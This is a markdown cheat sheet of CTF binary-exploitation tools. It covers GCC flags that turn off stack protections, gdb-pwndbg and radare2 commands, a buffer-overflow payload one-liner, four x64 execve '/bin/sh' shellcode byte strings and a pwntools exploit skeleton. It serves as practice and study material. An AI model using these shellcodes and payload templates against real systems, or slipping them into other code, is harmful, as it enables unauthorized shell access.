# CTF Tools

## Binary Exploitation

### GCC flags
- `-fno-stack-protector` -> disable canary
- `-no-pie` -> no PIE
- `-m32` -> compiles in 32 bit (i386)
- `-z execstack` -> disable NX and stack is executable now

A nice way to use this is 
```bash
gcc file.c -o vuln -fno-stack-protector -z execstack -no-pie -m32
```

### tmux
- `tmux`
- `ctrl + %, v` -> vertical split
- `ctrl + %, <-/->` -> change to left of right screen

### Know your file
`checksec --file <filename>` or `checksec file=filename

`file <filename>`

`rabin2 -I <filename>`

### Tracing
Checks what the program's doing with the input
`ltrace` and `strace`(for remote servers)
`ltrace ./filename`

### Reading the functions inside
- `info functions`
- `rabin2 -i <filename>`
- `objdump -d ./chal | grep '<.*>:'`
- `objdump -D <filename> | grep <funcitonname>`
- `nm -u <filename>`

USER GENERATED FUNCTIONS:

```bash
rabin2 -qs <filename> | grep -ve imp -e ' 0 '
```

### Strings inside binary
```bash
rabin2 -z <filename>
```

### gdb-pwndbg
(much faster than loading ghidra and doing stuff from there)
- `file <filename>` -> to open the file
- `info functions` -> show all the function names along with their addresses. (you can use this with `objdump -D <filename> | grep <funcitonname>`, which is much better)
- `disassemble main` -> disassemble the main funciton
- `disassemble <functionname>` -> disassemble particular functions

- `cyclic <number>` -> useful for testing when the seg faults
- `r` -> runs the function
- `cyclic -l <EIP-data>` -> lookup the amount of the data that can be inputted where overflow won't occur in little endian
- `python2 -c 'print "A"*28 + "\x82\x91\x04\x08"' > payload` -> 28 is the eip data and then the other code.
- `./ret2win < payload` -> input payload into the file
- instead, you can just send using `run < payload` inside of gdb-pwndbg
- `break *addr` -> add a breakpoint at an addr
- `delete breakpoints` -> delete breakpoints

**IP/EIP/RIP** -> Data where you can go without seg fault (data that can be stored in the variable/line)
**IP/EIP/RIP** -> Stores the address of the next function that must be executed (overflow this)

### python2 (not python3)
```python
python2 -c 'code here'
```

### redare
`r2 filename`
`aa` -> analyze all flags
`afl` -> all functions list

### Overwriting Variables on the Stack
- Replace the

### Shellcodes (NX disabled)
usage:
```python
payload = shellcode + b"A" * (80 - len(shellcode)) + b"B"*8 + p64(int(buff_addr, 16))
```
8 bytes for skipping RBP
`x64` linux `23` bytes:
```elixir
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
```

`x64` linux `24` bytes:
```elixir
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```

`x86_64` linux `22` bytes:
```elixir
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

`x86_64` linux `27` bytes:
```elixir
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

### Offset in libc
```bash
strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
```

```bash
readelf -Ws /usr/lib/x86_64-linux-gnu/libc.so.6 | grep printf
```


### PWN Tools
```python
from pwn import *
import sys
import os
from pprint import pprint

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    cmd = "ldd " + sys.argv[1] + " | grep \"libc.so.6\" | awk '{print $3}'"
    libcpath = os.popen(cmd).read()[:-1]
    libc = ELF(libcpath)
else:
    remote_addr = sys.argv[2].split(":")[0]
    remote_port = sys.argv[2].split(":")[1]
    p = remote(remote_addr, int(remote_port))

elf = ELF(sys.argv[1])
rop = ROP(elf)
```

Usage: `python3 exploit.py <filename>` or `python3 exploit.py 10.10.196.1:4000`

- Finding address of main: `elf.symbols['main']`
- Finding symbols: `elf.sym`
- Finding gadgets: `rop.find_gadget(['pop rdi', 'ret']))[0]`
- Finding Strings: `elf.search('/bin/cat flag.txt')` (Just use `rabin2 -z split`)

### Calling Conventions (Linux)
- 64-bit: `RDI, RSI, RDX, RCX, R8, R9, Stack`
- 32-bit: Stack
